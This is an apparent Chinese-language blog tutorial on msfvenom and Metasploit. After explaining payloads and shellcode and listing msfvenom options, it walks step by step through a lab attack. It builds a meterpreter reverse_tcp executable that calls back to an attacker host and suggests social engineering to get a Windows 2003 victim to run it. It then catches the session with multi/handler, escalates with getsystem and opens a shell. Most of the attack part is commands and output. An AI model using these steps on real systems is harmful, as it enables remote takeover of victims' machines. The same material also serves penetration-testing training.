
# 0x01 msfvenom 命令简介
msfvenom是payload产生器，也是shellcode代码生成器<br />Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。<br />Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名

整个字节流一般包含两个部分：

1. 一个包含部分代码的字节序列，被送入目标计算机执行，辅助攻击机获得控制权，比如打开目标计算机上的端口或者建立一个通信信道。
2. 一个用于实现在目标主机上运行某个应用程序如cmd或者计算器（常用于poc--概念验证）等。

一个攻击代码发送的字节序列往往同时包含payload和shellcode代码。


# 0x02 msfvenom 命令
1、生成可执行文件类型的payload
```
root@kali222:~# msfvenom    ---查看选项参数
Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
......此处省略
```

```
root@kali222:~# msfvenom -l payloads  --查看所有的payload

Framework Payloads (546 total) [--payload <value>]


    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh
......此处省略
```


# 0x03 利用实例

## 环境准备
win2003（192.168.1.64）作为靶机<br />kali（192.168.1.149）作为攻击机。

反弹型payload的使用：kali上侦听payload的运行，通过win2003上的payload的运行，反弹到kali.


## 实例

1. 在kali根目录生成test.exe文件
```
root@kali222:~#  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.149   lport=12345 -f exe -o /root/test.exe
```
<br />![](https://img-blog.csdnimg.cn/20200415133330504.png#crop=0&crop=0&crop=1&crop=1&id=hxHuW&originHeight=163&originWidth=570&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2. 将该test.exe文件复制到win2003中并运行（实际环境里面需要通过社工的方法让win2003运行）<br />![](https://img-blog.csdnimg.cn/20200415133744329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=i7ROO&originHeight=224&originWidth=341&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

3. 启动msfconsole，设置监听
```
root@kali222:~# service postgresql restart
root@kali222:~# msfdb init
root@kali222:~# msfconsole
```
<br />![](https://img-blog.csdnimg.cn/20200415134001539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=WOkGv&originHeight=457&originWidth=608&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

4. 打开PAYLOAD利用模块
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  --设置反弹PAYLOAD，和 msfvenom 中的命令保持一致
msf5 exploit(multi/handler) > set LHOST 192.168.1.149   --设置kali的ip
msf5 exploit(multi/handler) > set LPORT 12345  --设置kali的port ,需要与生成payload命令中的端口号一致
msf5 exploit(multi/handler) > show options
```
<br />![](https://img-blog.csdnimg.cn/2020041513425944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=dWvuN&originHeight=435&originWidth=606&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

5. 等待远程的payload先运行再执行exploit
```
msf5 exploit(multi/handler) > exploit -----在执行这步之前，win2003上的test.exe需要确保运行了
meterpreter > sysinfo   ---查看目标主机信息
```
<br />![](https://img-blog.csdnimg.cn/20200415134558855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=l7yaZ&originHeight=296&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

6. 提升权限
```
meterpreter > use priv  ---提升特权
meterpreter > getsystem  ---取得系统级权限
```
<br />![](https://img-blog.csdnimg.cn/20200415134705559.png#crop=0&crop=0&crop=1&crop=1&id=pggqW&originHeight=111&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

7. 进行shell
```
meterpreter > shell
```
<br />![](https://img-blog.csdnimg.cn/20200415134817500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=C5O19&originHeight=254&originWidth=612&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
发现成功控制win2003主机
